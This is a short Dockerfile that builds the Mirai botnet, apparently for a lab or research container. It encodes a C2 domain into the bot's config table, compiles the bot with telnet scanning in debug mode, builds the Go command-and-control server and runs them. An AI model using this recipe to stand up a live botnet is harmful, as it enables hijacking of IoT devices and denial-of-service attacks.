From 0kami/botnets:base

MAINTAINER wh1t3P1g <https://github.com/0kami>

ENV EVILDOMAIN mirai

COPY db.sql /root/
COPY run.sh /root/
COPY source /root/source
COPY prompt.txt /root


WORKDIR /root

RUN  myenc string $EVILDOMAIN | sed 's/\\/\\\\/g' > test.txt\
      && export EVILDOMAIN_HEX=`cat test.txt` \
      && sed -i "s/insert_here/$EVILDOMAIN_HEX/g" source/bot/table.c \
      && rm test.txt


RUN chmod a+x run.sh \
    && gcc -std=c99 source/bot/*.c -DDEBUG "-DMIRAI_TELNET" \
                        -static -g -o source/debug/mirai.dbg \
    && go build -o source/debug/cnc source/cnc/*.go \
    && mv source/debug/* /root && rm -rf source

CMD ["/bin/sh", "-c", "/root/run.sh"]


